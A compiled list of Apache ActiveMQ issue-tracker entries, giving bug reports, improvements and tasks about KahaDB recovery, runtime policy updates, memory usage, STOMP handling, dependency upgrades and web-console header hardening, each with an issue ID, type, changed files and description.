In DemandForwardingBridge, I"d like to be able to see subscription messages (and unsubscription messages), but not "bridging" messages.  Both classes of log messages are log.trace.  Seems like the "bridging" messages should remain trace, as you would want to look at that when you are doing pretty detailed debugging.  However, I"d like to see subscribe/unsubscribe messages all the time.  If those could be either info or debug, that would allow me to turn those on separately.  I realize that I can see what is currently subscribed via the JMX console.  However, seeing the subscribe/unsubscribe messages will allow diagnostics over time - who subscribed when type of questions.Mainly, I"m referring to messages logged as trace in:DemandForwardingBridge.serviceRemoteConsumerAdvisoryDemandForwardingBridge.removeDemandSubscription
issueID:AMQ-6080
type:Improvement
changed files:BrokerService.java
NetworkBridgeConfiguration.java
texts:Fix typos relating to AMQ-6027
I found a couple of minor typos from AMQ-6027 that I am fixing in a patch release.
issueID:AMQ-6082
type:Bug
changed files:
texts:StoreOpenWireVersion is not properly set on KahaDB index corruption recovery
The BrokerService has a property called storeOpenWireVersion to set the specified OpenWire version to use for the store.On start up, KahaDB will first set this value as the OpenWire version used in the index metadata in memory, and then if it detects a different version when reading in an existing index, it will reset the the version to the version that was detected.The problem is that if a corrupted index is detected during the reading of the index, the metadata is recreated in the catch block but the storeOpenWireVersion that was set on the BrokerService is never copied back to the new Metadata.  This happens in the open() method of MessageDatabase.This causes marshalling errors because the index will now be recreated with the default OpenWire version instead of the actual version that was set on the broker.
issueID:AMQ-6083
type:Bug
changed files:
texts:Broker starts on corrupted kahadb despite checkForCorruptJournalFiles="true" and ignoreMissingJournalfiles="false"
Kahadb checkForCorruptJournaFiles will pick up journal corruption via the checksum, but if the corrupt locations are not referenced by the index the corruption is ignored, even if ignoreMissingJournalFiles (which should be called ignoreMissingJournalFilesOrCorruptJournalLocations) is false (the default).this means that acks can be missing and in the event of a journal replay, there is no indication of the missing acks.If ignoreMissingJournalFiles=false and corruption or missing journal files that just have acks are detected, the broker should error out.This ensures that corruption does not go unnoticed and the root cause can be determined before restart.
issueID:AMQ-6084
type:Sub-task
changed files:
texts:Have an option to error out if a limit is exceeded
If a broker exits due to no space    <ioExceptionHandler>       <defaultIOExceptionHandler ignoreNoSpaceErrors="false"/>   </ioExceptionHandler> i.e: some other process uses disk space. On a restart it will reset the limits and block pending space. Flow control will kick in. It may not be possible to consume messages in this stage. However it will not allow clients to failover to another broker.I think we should have an option to force the broker to error out, or fail to start if limits are set and they cannot be satisfied.This will ensure that the broker will not accept connections in that state.it could be<broker adjustUsageLimits="false" ..>When false, if the limits are exceeded, store usage or memory usage - the broker fails to start. When true, it adjusts them (like today) to what is available.As ever, naming things is hard. Any better name?
issueID:AMQ-6086
type:Bug
changed files:
texts:Broker stop and start are not at all thread safe - we can do better
If one thread starts a broker and a second tries to stop we can get in a mess. Particularly if there is blocking or locking in the mix. In some cases we are ok but there is no determinism.In a simple case, the stop can complete before the start gets going at all and we miss the stop, leaving a dangling broker.
issueID:AMQ-6088
type:Bug
changed files:
texts:Runtime configuration does not properly apply policy updates
There is 1 bug and 1 improvement with policy modification at runtime with both the XML runtime broker and Java runtime broker.For the bug portion, when a new policy is added there is no check to see if there are any more specific policies that should be used.  So if a policy called "queue.test.child.>" exists, and then a new policy for "queue.test.>" is added, this will update destinations that match the more specific policy and it shouldn"t.  There is a check for this for modification (as seen below) but not on adding a new policy.For the improvement, when modifying a policy entry, an entry can only be modified if there are no children entries.  This is a problem because if two policies exist, say for "queue.test.>" and "queue.test.child.>", we can not modify "queue.test.>" because there is logic to prevent this.  This is done to prevent reapplying changes to destinations that might be affected by "queue.test.child.>".  (which breaks on an add)However, with the use of the policy map we should be able to update any policy and figure out which specific destinations because we can look up whether or not the policy being updated should be applied to the destination.  So this limitation should be removed and the proper logic should be applied for both adding and updating policies.This should be merged into 5.13.1 because it"s a bug fix and improvement to how policies are applied.
issueID:AMQ-6089
type:Bug
changed files:
texts:org.apache.activemq.TransactionContext.recover(int flag) should return null or an empty array when it receives the flag  XAResource.TMNOFLAGS as it has return all transactions when called with  XAResource.TMSTARTRSCAN. or XAResource. TMENDRSCAN.
org.apache.activemq.TransactionContext implements XAResource.  The recover method currently ignores the flag parameter, returning all transaction regardless of flags passed to it.  This behaviour cause our transaction manager (IIB) to go into an indefinite loop.  It is expecting to get an empty array or null when XAResource.TMNOFLAGS is passed as all transactions where returned by the prior XAResource.TMSTARTRSCAN call.
issueID:AMQ-6091
type:Improvement
changed files:
texts:Java runtime policy update should support a list of properties to apply retrospectively
Right now when the JavaRuntimeConfigurationBroker is used to update a Policy entry, every property of the Policy is re-applied to matching destinations after update.  It would also be nice if an optional list of properties could be provided during the update.  The behavior of this option would be to still apply the entire Policy entry update (so all new destinations get the policy changes), but for existing destinations only properties that match what"s in the property list would get applied.The use case here would be wanting to apply only one or more properties that changed on a Policy to a destination, but not wanting to overwrite the other properties that might have been changed since creation of the destination.For example, say through JMX someone updated the maxPageSize property on a specific Queue to something other than what is specified on the Policy.  After the fact, it might be desirable to update a different property on the policy that matches that Queue and have it be applied to the Queue.  Normally this policy update would overwrite all properties on the existing Queue, but in this case we would not want to overwrite the maxPageSize setting as it was changed after the fact.  So providing a list of properties to apply would prevent that setting from being changed.
issueID:AMQ-6093
type:Task
changed files:BrokerView.java
BrokerViewMBean.java
texts:Remove deprecated getXURL methods from the BrokerServiceMBean
The methods getOpenWireURL(), getStompURL(), getSslURL(), and getStompSslURL() were marked deprecated in the 5.7.0 release in AMQ-3918 and should be removed now.  This patchwork of URL accessors don"t reflect the full set of transport connectors that can be configured and won"t provide correct responses depending on configuration.
issueID:AMQ-6094
type:Bug
changed files:
texts:Memory Leak with abnormal disconnecting consumers
On our production ActiveMQ broker (processes around 10 000 messages / sec in average) we have encountered situations where queues started blocking completely after running without problems for a couple of days.When taking a look at the activemq logs, we can see messages like this (I"ve changed queue names and client IPs):2015-12-17 20:52:37,375 | INFO  | Usage(default:memory:queue://Consumer.AAA.VirtualTopic.OFFER:memory) percentUsage=100%, usage=104858538, limit=104857600, percentUsageMinDelta=1%;Parent:Usage(default:memory) percentUsage=42%, usage=305669289, limit=720424141, percentUsageMinDelta=1%: Usage Manager Memory Limit reached. Producer (ID:ip-172-30-0-97-38230-1450370654525-1:8:1:1) stopped to prevent flooding queue://Consumer.AAA.VirtualTopic.OFFER. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 151s) | org.apache.activemq.broker.region.Queue | ActiveMQ Transport: tcp:///1.1.1.1:36128@61616The strange thing is, when taking a look at the admin interface, there are no messages queued in the above mentioned queue and also purging the queue does not help.The only thing that works (that we found out so far) (to get the broker process messages again) in the above situation is: delete the queue (it then is recreated automatically and works again) restart the brokerI have now tried to reproduce the situation locally and come up with a test case that, while I am not sure if that is the exact problem that we face in production, at least produces the same problem as mentioned above. I have noticed that we sometimes have network issues between the clients and the broker and therefore have done something similar in the test code.The test code launches 4 producing threads and 4 consuming threads. The producers > 1000 messages / sec to the queues and the consumers just read them. Once after a while (every 10 seconds), one of the consuming threads is interrupted and then, with a delay of another 10 seconds, the connection is cleaned up (to free up the allocated messages that are already in the dead connections prefetchBuffer). When running the test case on a fresh download of activeMQ 5.13.0, it takes a long time until the broker completey blocks, as it takes time for the memory to fill up. However, when checking JMX stats, it is clearly visible, that the following metrics behave strangely: CursorMemoryUsage MemoryUsageByteCountBoth above metrics are quite constant for some time, and then, once a thread gets interrupted and the connection cleaned up, it suddenly increases by couple of mbytes ... then, again, while the consumers and producers work normally, the size is quite constant, until again, a consumer is interrupted, which again increases memory for couple of mbytes ... and this continues until memory is completely full and no messages can pass anymore through the broker.To speed things up, a lower memory limit can be placed on the queue in the activemq.xml configuration file, which will lead to shorter waiting time before the broker blocks messages on the queue.Even terminating the client jvm does not free up resources on the broker.
issueID:AMQ-6096
type:Improvement
changed files:
texts:AMQP: Update to latest bugfix release of Proton-J
Update proton to latest version which includes some fixes for credit handling issues.
issueID:AMQ-6097
type:Bug
changed files:
texts:KahaDB message size metrics can be inaccurate
I have found during testing that the reported size of the messages in a KahaDB store can be shown as too high in certain cases.  The message count values are accurate, however.My testing as shown that when publishing a large quantity of messages with several producers (a couple hundred thousand) and then consuming them with several consumers, when all the messages are consumed and the count is 0, the reported size will still be greater than 0.
issueID:AMQ-610
type:Test
changed files:
texts:fix the test case FanoutTransportBrokerTest which is failing now due to the fix for AMQ-607 by making the open of the socket occur in the start() method
None
issueID:AMQ-6100
type:Improvement
changed files:
texts:Virtual topic message destination should be the target queue
When message is delivered using virtual topic, it will have original topic as its JMSDestination property. The better way would be to have this value set as OriginalDestination property on ActiveMQMessage object, and use the target queue name as the JMSDestination.Additionally, the current implementation leads to inconsistency in the broker cluster environment as this value is change when forwarding the message over the network.
issueID:AMQ-6101
type:Task
changed files:
texts:AMQP: Update Qpid JMS to the latest release
Update to the latest release of Qpid JMS
issueID:AMQ-6102
type:Bug
changed files:
texts:JMX SubscriptionViewMBean reset statistics method doesn&#39;t reset
The resetStatistics method for the SubscriptionViewMBean implementation does not reset statistics for the subscription.
issueID:AMQ-6104
type:Improvement
changed files:
texts:Upgrade to Spring 4.1.9
Spring framework 4.1.9 was just released and we should update to it as it is intended to be the final maintenance and bug fix release in the 4.1.x branch.
issueID:AMQ-6105
type:Improvement
changed files:SubscriptionView.java
JobSchedulerViewMBean.java
JobSchedulerView.java
SubscriptionViewMBean.java
texts:Remove deprecated methods from JMX tree
Remove the deprecated methods from the JMX treeJobSchedulerViewMBean#removeJobAtScheduledTimeMarked as deprecated in 2014 first appeared as deprecated in 5.11.0SubscriptionViewMBean#getSubcriptionIdSubscriptionViewMBean#getSubcriptionNameMarked as deprecated in 2013 first appeared as deprecated in 5.10.0
issueID:AMQ-6107
type:Task
changed files:AmqpTransportFilter.java
texts:AMQP: Remove deprecated prefetch size configuration option from the transport
Remove the previously deprecated setPrefetch option from the AmqpTransportFilter as this value is not used and is set by the client properties.
issueID:AMQ-6108
type:Bug
changed files:SelectorManager.java
texts:SelectorManager Executor is not shutdown when transport os stopped.
SelectorManager creates an Executor that is not shut down on termination of the Transport.The Executor currently uses non-daemon threads and is is not guaranteed the the SelectorWorker thread exit condition is ever met.This causes the shutdown to hang when using transports that utilise the SelectorManager, such as nio+ssl for example.The proposed patch shuts down the ExecutorService on/after Transport shutdown. The SelectorWorkers also check for this as an exit condition.
issueID:AMQ-6109
type:Bug
changed files:
texts:Destination with wildcard may not have correct policy applied
When a destination is created with a wildcard, it may not have the correct policy applied.  For example, if there are two policies:<policyMap>    <policyEntries>         <policyEntry queue="test.queue.>" memoryLimit="20mb" />         <policyEntry queue="test.queue.a" memoryLimit="5000000"  />     </policyEntries></policyMap>and if the queue test.queue.> is created, the policy for test.queue.a will be applied to that destination instead of the test.queue.> policy.Some work was done on this in AMQ-5972 and that seems to have fixed most of the issues, but there is this one edge case where we need to account for what happens if a policy matches a destination exactly.
issueID:AMQ-6112
type:Bug
changed files:
texts:activemq.jar : regression in file permissions
In 5.12.X : activemq.jar is 0644 and wrapper.jar is 0755> ls -al apache-activemq-5.12.0/bin drwxrwxr-x  5 myuser myuser  4096 janv.  7 10:27 .drwxr-xr-x 10 myuser myuser  4096 août  10 17:26 ..-rwxr-xr-x  1 myuser myuser 21748 août  10 17:26 activemq-rwxr-xr-x  1 myuser myuser  6189 août  10 17:26 activemq-diag-rw-r--r--  1 myuser myuser 15958 août  10 17:21 activemq.jar-rw-r--r--  1 myuser myuser  4881 août  10 17:26 envdrwxrwxr-x  2 myuser myuser  4096 janv.  7 10:27 linux-x86-32drwxrwxr-x  2 myuser myuser  4096 janv.  7 10:27 linux-x86-64drwxrwxr-x  2 myuser myuser  4096 janv.  7 10:27 macosx-rwxr-xr-x  1 myuser myuser 83820 août  10 17:11 wrapper.jarIn 5.13.X : activemq.jar is 0600 and wrapper.jar is 0700> ls -al apache-activemq-5.13.0/bindrwxrwxr-x  5 myuser myuser  4096 janv.  7 10:26 .drwxr-xr-x 10 myuser myuser  4096 nov.  30 15:14 ..-rwxr-xr-x  1 myuser myuser 21250 nov.  30 15:14 activemq-rwxr-xr-x  1 myuser myuser  6189 nov.  30 15:14 activemq-diag-rw-------  1 myuser myuser 15977 nov.  30 15:09 activemq.jar-rw-r--r--  1 myuser myuser  4881 nov.  30 15:14 envdrwxrwxr-x  2 myuser myuser  4096 janv.  7 10:26 linux-x86-32drwxrwxr-x  2 myuser myuser  4096 janv.  7 10:26 linux-x86-64drwxrwxr-x  2 myuser myuser  4096 janv.  7 10:26 macosx-rwx------  1 myuser myuser 83820 nov.  30 14:53 wrapper.jarThis regression broke my automated deploy process and now I need to modify the release files (which is really not a great thing ....)Can you fix this packaging regression ?Thanks
issueID:AMQ-6113
type:Bug
changed files:web.xml
XFrameOptionsFilter.java
texts:Add the X-Frame-Options" header for the WebConsole
The X-Frame-Options header is missing for the ActiveMQ Web Console and it should be added to all responses
issueID:AMQ-6116
type:Improvement
changed files:
texts:Improve security context authorization cache
The read cache is never used, so we should remove it. Also, there"s a potential for the write cache to never be cleaned, if the authentication plugin don"t do it.
issueID:AMQ-6117
type:Bug
changed files:
texts:QueueView method output is not in sync with actual queue
After upgrading from 5.10.2 to 5.13.0, it seems that the data provided by the QueueView methods is not in sync with the actual queue.When removing messages from the DLQ via QueueView.removeMessage(String), the message is actually removed from the queue but QueueView.browse() still lists the message.When new messages arrive on the DLQ via JMS, the output of QueueView.browse() still lists the stale message.Only when an action is performed via the ActiveMQ admin console (e.g. refresh browse.jsp for that queue) the JMX output is refreshed. The QueueSize attribute of the queue however, is always accurate when accessed via JMX.
issueID:AMQ-6118
type:New Feature
changed files:
texts:ActiveMQ SSL CRL Checking via OCSP
For some unknown reason, the CRL Check via OCSP isn"t working in Windows ActiveMQ 5.12.1After reviewing the Linux distribution of Activemq there was a configuration line found in the file bin/env.The Config in Linux Distribution looked like: Set additional JSE arguments#ACTIVEMQ_SSL_OPTS="-Dcom.sun.security.enableCRLDP=true -Docsp.enable=true -Docsp.responderURL=http://ocsp.example.net:80"Where to set it in Windows file distribution? Tried to set it in activemq file but no success. I couldn"t see any request going to the responder URL which I configured.Think there is a general Problem with the code concerning OCSP functionality.
issueID:AMQ-612
type:Bug
changed files:MessageEndpointProxy.java
ServerSessionPoolImpl.java
texts:NPE could occur if endpoint factory never creates any endpoints.
This would be an edge case, since it would be odd that the endpoint factory never creates and endpoint, but it could happen if the endpoint factory is invalid for some reason.
issueID:AMQ-6121
type:Bug
changed files:
texts:Messages can continually expire from DLQ and back
In some cases it is possible for a message on the DLQ to retain its expiration value such as when LevelDB reads a duplicate from the store.  In these cases the message can end up being expired and sent back to the DLQ over and over.  This leads to inaccurate statistics on the DLQ among other things.
issueID:AMQ-6124
type:Bug
changed files:
texts:failover backup transports do not update the brokerInfo leaving stale org.apache.activemq.ActiveMQConnection#getBrokerName
with broker url failover:(tcp://a:<port>,tcp://b:<port> ")?randomize=false&priorityBackup=true The brokerName as reported by org.apache.activemq.ActiveMQConnection#getBrokerName stays at A even after failover to B.The backup transport are started up front and the brokerInfo is not cached so it  never gets replayed to the jms connection.The same is true for the backup attribute
issueID:AMQ-6125
type:Bug
changed files:
texts:Potential NPE in session rollback if no default redlivery policy configured
If the RedliveryPolicyMap is set on a ConnectionFactory and no default entry is set on that instance than the MessageConsumer can throw an NPE on Rollback because its policy will be null.
issueID:AMQ-6126
type:Improvement
changed files:TaskRunnerFactory.java
texts:The corePoolSize value of the TaskRunnerFactory created Executor should be configurable
It is currently not possible to alter the corePoolSize value of the Executor created in the TaskRunnerFactory in order to keep some Threads always active and avoid some Thread churn that might otherwise happen.
issueID:AMQ-6127
type:Wish
changed files:TransportConnector.java
texts:Broker to not log "Could not accept connection" as error during shutdown
Broker emits2016-01-14 22:50:21,972 | ERROR | t.maxFrameSize=104857600 | TransportConnector               | vemq.broker.TransportConnector$1  242 | 163 - org.apache.activemq.activemq-osgi - 5.12.2 | Could not accept connection : java.lang.InterruptedExceptionduring shutdown.Can the log level be reduced to WARN? I don"t see this as an error situation.Also, the thread name is no longer recognizable, not sure it needs to include the options?
issueID:AMQ-6128
type:Bug
changed files:
texts:browsing priority queue can return messages in different order than they will be consumed
with queue policyEntry prioritizedMessages=true, consumers get messages in the expected priority but the results of a browser consumer do not always match.
issueID:AMQ-6129
type:New Feature
changed files:
texts:Add NetworkBridge Statistics
I noticed in that in the NetworkBridges there are only 2 statistics...enqueues and dequeues.  It would also be nice to have some new statistics added as well.  One in particular would be a received count when in duplex mode.A new NetworkBridgeStatistics class should be added that can contain these new metrics and can be added to in the future easily as new statistics are necessary.
issueID:AMQ-6130
type:Improvement
changed files:
texts:Improve message conversion to other formats
Some external tools might use java beans API to convert the messages to other formats, like JSON. We need to make sure some of the internals are properly marked as transient, so we don"t convert them
issueID:AMQ-6131
type:Bug
changed files:
texts:Durable subscription rewrote in journal can be to agressive and cause message loss on recovery
The compaction logic that attempt to move a durable subscription commands forward in the journal when the subscription has no pending messages is to aggressive and can rewrite to early leading to loss of messages if the state is recovered from the journal instead of having a valid index to read from.
issueID:AMQ-6133
type:Bug
changed files:Queue.java
texts:Message updates can cause message loss on recovery
After doing some testing with AMQ-6131, I noticed a similar issue where messages can be lost if a message update is called.Normally when KahaDB gets a KahaUpdateMessageCommand it will update the index with the new location.  This works except that if the index is deleted or corrupted and needs to be rebuilt, the replay process may not be able to recover the message.This happens because after the message is updated, KahaDB is free to garbage collect the file with the original add command.  So, whatt happens is that during replay when the update command is seen KahaDB rejects it because it can"t find the original message if that file has been GC"d.  This happens in the updateIndex method of MessageDatabase on line 1395 where it prints out a warning saying "Non existent message update attempt rejected".I am attaching a unit test that demonstrates the issue where the count after restart is missing messages.
issueID:AMQ-6136
type:Bug
changed files:
texts:Activemq client OSGi feature should support Spring 4.x
The features-core.xml file in the activemq-karaf project currently lists a version for Spring as [3.2,4) but this should be [3.2,5) as ActiveMQ 5.13.0 upgraded to Spring 4.1.x
issueID:AMQ-6137
type:Bug
changed files:
texts:Special escape characters in LIKE selectors do not work as expected
foo LIKE "%_%" ESCAPE "%"should map to regexp:  \A_.*?
issueID:AMQ-6138
type:Improvement
changed files:
texts:ACTIVEMQ_CLASSPATH not extendable
The current start script "activemq" prevents the environment variable ACTIVEMQ_CLASSPATH from being extended from the outside. line #112:IS: ACTIVEMQ_CLASSPATH="$ACTIVEMQ_BASE/../lib/"SHOULD: ACTIVEMQ_CLASSPATH="$ACTIVEMQ_BASE/../lib/;$ACTIVEMQ_CLASSPATH"line #278:Delimiter should be semicolon, since this is used in org/apache/activemq/console/Main.java#274. Refer also to (AMQ-5913).IS: ACTIVEMQ_CLASSPATH="${ACTIVEMQ_CONF}:${ACTIVEMQ_CLASSPATH}"SHOULD: ACTIVEMQ_CLASSPATH="${ACTIVEMQ_CONF};${ACTIVEMQ_CLASSPATH}"
issueID:AMQ-6142
type:Bug
changed files:
texts:ActiveMQBytesMessage decompress throws DataFormatException incorrect header check
In our environment we use an embedded broker. On one topic where compression is enabled, the server is also listening in on the messages. From ActiveMQ 5.10.0 up to 5.13.0, we encounter DataFormatException: incorrect header check exceptions on the tcp clients due to corruption of the payload. Attached are a test server and client. At some point, the client will exit due to mentioned exception. Increase chances by running multiple clients. This scenario works with 5.8.0 and 5.9.1.If the server has multiple consumers on the same topic, they will encounter corruption as well, but this has other side-effects.
issueID:AMQ-6143
type:Bug
changed files:
texts:Upgrade dependencies in 5.13.0
Please upgrade org.springframework to at least version 4.1.9 (preferably version 4.2.4) and org.apache.taglibs to version 1.2.3 or 1.2.5.
issueID:AMQ-6146
type:Bug
changed files:
texts:Use proper JSTL tags in the WebConsole
Some places in the WebConsole are not using the correct JSTL tags to print content in all cases.  We should look at all the JSP pages and make sure correct tags are used.
issueID:AMQ-6147
type:Improvement
changed files:pom.xml
UnmodifiableTransport.java
UnmodifiableDelivery.java
UnmodifiableLink.java
texts:AMQP: Update Proton-J to 0.12.1
Update proton to latest version
issueID:AMQ-6149
type:Improvement
changed files:
texts:Pre-configure jolokia
We should configure jolokia in the broker
issueID:AMQ-615
type:Improvement
changed files:PooledSession.java
texts:org.apache.activemq.pool sessions should not allow you to create consumers
The create consumer methods should throw JMSExceptions since using consumers with pooled sessions would result in non deterministic behaviour.
issueID:AMQ-6150
type:Bug
changed files:ServerSessionPoolImpl.java
texts:Found (and fixed) 3 instances of impossible casts in the activemq code
Running static analysis on activemq I was able to identify 3 instances of impossible casts in the code. Attaching patch files to fix.
issueID:AMQ-6151
type:Bug
changed files:
texts:Redelivered messages bypass priority ordering
messages prefetched and redispatched or messages redelivered are dispatched first to preserve queue order. However when message priority must be respected, priority must take precedence.Both the relative priority of pending and redelivered needs to respect priority and the order of newly pages in w.r.t redelivered needs to respect priority.
issueID:AMQ-6152
type:Bug
changed files:
texts:KahaDB scheduler log files not being deleted
Something is holding onto KahaDB scheduler log files. We have reports of up to 400GB of scheduler log files. I have tried to isolate the issue and create a minimal example (attached). In the troubleshooting I have done, the scheduler GC process is running, it"s just deciding not to GC files that it should be. I have also found behavior inconsistent on the log files it does remove. The ran the attached example/test on 5.10.0, 5.11.1, 5.12.0 and 5.13.0. The test schedules 20 messages that are large enough to cause 4 log files to be created. It then consumes all 20 messages. When on 5.10.0, it behaves like I would expect, files 1-3 are GC"d and the 4th (the current log file) is left. On all other versions I"ve tried it always leaves the first 2 files, and sometimes will GC the 3rd.Below is a snippet from the log of the scheduler process and why it"s deciding not to GC these files:2016-02-01 16:32:33,327 DEBUG [main] [o.a.a.s.k.s.JobSchedulerStoreImpl] Job Scheduler Store Checkpoint started.2016-02-01 16:32:33,338 TRACE [main] [o.a.a.s.k.s.JobSchedulerStoreImpl] Last update: 4:29447367, full gc candidates set: [1, 2, 3, 4]2016-02-01 16:32:33,338 TRACE [main] [o.a.a.s.k.s.JobSchedulerStoreImpl] gc candidates after reference check: [1, 2, 3]2016-02-01 16:32:33,338 TRACE [main] [o.a.a.s.k.s.JobSchedulerStoreImpl] A remove in log 1 has an add still in existance.2016-02-01 16:32:33,339 TRACE [main] [o.a.a.s.k.s.JobSchedulerStoreImpl] A remove in log 2 has an add still in existance.2016-02-01 16:32:33,339 TRACE [main] [o.a.a.s.k.s.JobSchedulerStoreImpl] A remove in log 3 has an add still in existance.2016-02-01 16:32:33,339 TRACE [main] [o.a.a.s.k.s.JobSchedulerStoreImpl] gc candidates after removals check: []2016-02-01 16:32:33,339 DEBUG [main] [o.a.a.s.k.s.JobSchedulerStoreImpl] Job Scheduler Store Checkpoint complete.2016-02-01 16:32:33,727 INFO  [main] [o.a.a.s.k.s.JobSchedulerStoreImpl] JobSchedulerStore: test-mq/localhost/scheduler stopped.This issue was originally reported in the Open Source PuppetDB project, ticket here.
issueID:AMQ-6153
type:Improvement
changed files:TcpTransport.java
texts:Toggle the TCP transport&#39;s ability to size a socket&#39;s read and write buffer
This improvement only applies when running ActiveMQ on Linux.At the moment the TCP transport sets the size of the accepted socket"s read and write buffer (64k by default). They can be given different sizes using the relevant transport connector options.However, on Linux once a socket has had either its read or write buffer size explicitly set the kernel will not automatically tune its size at run-time.Therefore add a new flag to instruct the TCP transport connector to not set the size of the socket"s buffers. Said flag should default to false for backward compatibility.If the flag is true the TCP transport will ignore any configured size of the socket"s buffers. Perhaps print a warning? This will allow the kernel to auto-tune the socket"s buffer at run-time according to the kernel parameters net.ipv4.tcp_rmem and net.ipv4.tcp_wmem.Flag name suggestion: disableSocketBufferSizing
issueID:AMQ-6158
type:Bug
changed files:
texts:Computing pending message size for a durable subscription is very slow
AMQ-5923 added a new feature to compute the pending message size for a durable subscription.  The problem is that the current algorithm used in KahaDB to iterate over the pending messages for a subscription runs in O(n^2) because it uses the wrong index (location index) to compute the size.Now that AMQ-6097 has been resolved so that the order index contains size information for messages as well, we can rewrite the algorithm to be O&#40;n) which will make this run significantly faster for large pending message sizes (such as 100k messages, etc)
issueID:AMQ-6159
type:Bug
changed files:
texts:In-Memory JobScheduler handles cron repeats incorrectly
The cron entry is handled incorrectly when the rescheduling is done and an assigned repeat will be missed.
issueID:AMQ-6164
type:Improvement
changed files:
texts:queue sendLock prevents concurrent journal updates
concurrent producers contend on the queue sendlock rather than on the journal, preventing batching or in the case of jdbc, concurrent writes to the db.The sendlock protects message order, however order is ultimately determined by the sequence id assigned by the persistence adapter. The ground work for aligning the cursors with the journal sequence ids was layed in https://issues.apache.org/jira/browse/AMQ-4485 and https://issues.apache.org/jira/browse/AMQ-5266With the ordering between transacted and non transacted producers overlapping the cursor already respects the journal ordering, the sendLock need no longer protect the journal update.With parallel journal updates we get the benefit of write batching (sharing an fsync) for multiple producers on a single destination.
issueID:AMQ-6166
type:Improvement
changed files:ActiveMQComponent.java
ActiveMQConfiguration.java
texts:Add option to configure trustAllPackages on Camel ActiveMQ component
Sadly we forgot to add it here, so Camel end users have more trouble to set this option.We should make it dead easy as an option.
issueID:AMQ-6167
type:Improvement
changed files:
texts:examples/other/perfharness misses readme and uses broken link.
The Perfharness demo in examples/other/perfharness  misses a short readme.md that describes the demo refers to broker link http://www.alphaworks.ibm.com/tech/perfharness in perfharness-activemq.sh
issueID:AMQ-6168
type:Bug
changed files:
texts:STOMP: Connection should be closed on receiving an invalid STOMP Frame with unknown action value.
When a STOMP frame comes in and the "action" is not known the transport doesn"t currently throw a fatal protocol exception.  This can lead to issues if the incoming data is corrupt and the transport can continue to try and read more commands from the stream and start logging binary data or reading in garbage commands.
issueID:AMQ-6169
type:Bug
changed files:ProtocolConverter.java
texts:STOMP: Invliad frames are logged in warn messages
When the STOMP protocol converter encounters a frame that is badly encoded it logs out a warning that prints the entire frame contents in the warn message.  This leads to some confusing results or logs of "null" as the decoder never got to creating a full frame instance before failing.  If the frame happens to get read but contains corrupted data the log can get spammed with garbage characters and becomes somewhat unreadable.  We should not log the frame if there is one at warn level, perhaps allow for trace logging it.  We could attempt to log the frame Action if one was read and is valid but otherwise should not pollute the logs with entire frames.
issueID:AMQ-617
type:Bug
changed files:
texts:when sending 16383 messages over the same connection with caching enabled we get a ClassCastException
The exceptions are always along these lines...16:20:30,864 INFO &#91;STDOUT&#93; java.lang.ClassCastException: org.apache.activemq.command.XATransactionId 16:20:30,865 INFO &#91;STDOUT&#93; at org.apache.activemq.openwire.v1.TransactionInfoMarshaller.unmarshal(TransactionInfoMarshaller.java:67) 16:20:30,865 INFO &#91;STDOUT&#93; at org.apache.activemq.openwire.OpenWireFormat.doUnmarshal(OpenWireFormat.java:214) 16:20:30,865 INFO &#91;STDOUT&#93; at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:181) 16:20:30,865 INFO &#91;STDOUT&#93; at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:135) 16:20:30,865 INFO &#91;STDOUT&#93; at java.lang.Thread.run(Thread.java:595) see the test case MarshallingWithCachingTest for how to reproduce the problem.
issueID:AMQ-6170
type:Bug
changed files:web.xml
jetty-demo.xml
jetty.xml
XFrameOptionsFilter.java
texts:X-Frame-Options are not set for static content
In AMQ-6113, The X-Frame-Options header was added to the web console.  Unfortunately that patch isn"t quite correct because static content is still missing this header.
issueID:AMQ-6171
type:Bug
changed files:
texts:legal colon in broker name breaks vm transport
A colon is acceptable in a broker brokerName attribute. However a network connector will fail to create a local vm connection in this case, in error. In addition there is little logging and the network connector is not retried.
issueID:AMQ-6175
type:Bug
changed files:BrokerView.java
ManagementContext.java
ManagedRegionBroker.java
texts:ActiveMQ webconsole breaks when supressMBean is used
AMQ-5656 which included the suppressMBean function broke the web console that comes with ActiveMQ.  The proxied calls to ManagedRegionBroker will obtain objects that are not registered with the MBean server and thus the web console breaks with invalid JSP when executed, which ultimately is caused by javax.management.InstanceNotFoundException.  The fix for this is to have the web calls filter out lists that contain any non-MBeans.
issueID:AMQ-6176
type:Improvement
changed files:
texts:Update Saxon version to 9.5.1-5_1
I had some Camel routes running embedded in the broker that were using xpath filters and were throwing exceptions from Saxon until I upgraded the Saxon dependency. The exceptions only occurred when running the broker with Java 8 but not Java 7.This is not the most recent version of the JAR. However, it is the earliest version where the bug appears to be fixed (trying not to make too many changes at once).I"ll supply patch files shortly.
issueID:AMQ-6177
type:Bug
changed files:
texts:Make ActiveMQ build and test pass in Newfoundland
Certain tests such as org.apache.activemq.broker.scheduler.CronParserTest, require a build/test to be run on an epoch that is aligned with the hour. In timezones such as Newfounland, which is shifted by 30 minutes, these tests fail.Lets update the build/test suite to work in any time zone.(Verified by changing timezone from NST to EST &#8211; on EST the test suite passes)
issueID:AMQ-6178
type:Task
changed files:
texts:AMQP: Update Qpid JMS to 0.9.0
Update to use the latest release of Qpid JMS
issueID:AMQ-618
type:Bug
changed files:
texts:Streamlets cause OutOfMemoryError with non-persistent embedded broker
When streaming large amounts of data (that exceed the VM"s permitted maximum), an OutOfMemoryError is thrown.Turning on persistence (changing BROKER_URL to "vm://localhost?broker.persistent=true") seems to work, but I"d like to stream without taking the persistence hit.
issueID:AMQ-6181
type:Task
changed files:
texts:Upgrade to Joda-time 2.9
Since joda-time is stable on 2.9.x I think it is good to upgrade the bundle used in activemq-karaf
issueID:AMQ-6182
type:Task
changed files:
texts:disable TRACE method in apache activeMQ Server
For security reasons, have to disable TRACE method in Apache ActiveMQ Server, unable to do it.Could you please help me to disable TRACE method in Apache ActiveMQ server ( Jetty 7.x - Internal Server)
issueID:AMQ-6183
type:Bug
changed files:
texts:Provide the DispatchAsync value on Subscriptions to the SubscriptionViewMBean
The SubscriptionVewMBean does not expose the dispatchAsync property from a consumer.The ProducerViewMBean does expose a dispatchAsync value from a producer which is never used and leads to some confusion.
issueID:AMQ-6184
type:Improvement
changed files:NIOTransport.java
TcpTransportServer.java
SelectorManager.java
texts:Improve nio transport scalability
